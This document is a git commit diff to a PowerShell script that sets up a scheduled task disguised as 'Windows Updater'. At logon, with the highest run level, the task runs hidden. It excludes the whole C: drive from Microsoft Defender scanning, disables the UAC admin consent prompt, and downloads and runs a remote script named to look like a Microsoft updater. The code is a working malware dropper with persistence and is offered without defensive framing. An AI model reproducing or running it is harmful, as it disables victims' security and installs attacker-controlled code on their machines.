034388d1f9d1a03cf63a05cc1e294f99cd17d43d
Ahmed Moustafa <30881400+AhmedK97@users.noreply.github.com>
2023-08-18 15:31:15 +0300

    fix bugs

--- RunLevel Highest.ps1
+++ RunLevel Highest.ps1
@@ -1,7 +1,5 @@
-$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command
-"Add-MpPreference -ExclusionPath \"C:\";
-Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name
-ConsentPromptBehaviorAdmin -Value 0;
+$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "Add-MpPreference -ExclusionPath \"C:\";
+Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0;
 $url1 = \"https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/Microsoft.updater.ps1\";
 $downloadsFolder1 = [Environment]::GetFolderPath(\"User\");
 $outputPath1 = Join-Path -Path $downloadsFolder1 -ChildPath \"download.ps1\";
@@ -16,9 +14,24 @@ Invoke-WebRequest -Uri $url -OutFile $outputPath;
 while ((Test-Path -Path $outputPath) -eq $false) {
 Start-Sleep -Seconds 1
 };
-Start-Process -FilePath $outputPath"'
+Start-Process -FilePath $outputPath -NoNewWindow"'
 $Trigger = New-ScheduledTaskTrigger -AtLogon
-$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -TaskName
-"MyScheduledTask"
+Register-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings -TaskName "Windows Updater"
+
+$taskName = "Windows Updater"
+
+# Get the task
+$task = Get-ScheduledTask -TaskName $taskName
+
+# Modify the task settings
+$taskPrincipal = $task.Principal
+$taskPrincipal.RunLevel = 1 # Highest
+$task.Principal = $taskPrincipal
+
+# Update the task with modified settings
+Set-ScheduledTask -TaskName $taskName -TaskPath $task.TaskPath -Principal $taskPrincipal
+Write-Host "Task '$taskName' has been modified to RunLevel Highest."
+
+# Start the modified task
+Start-ScheduledTask -TaskName $taskName
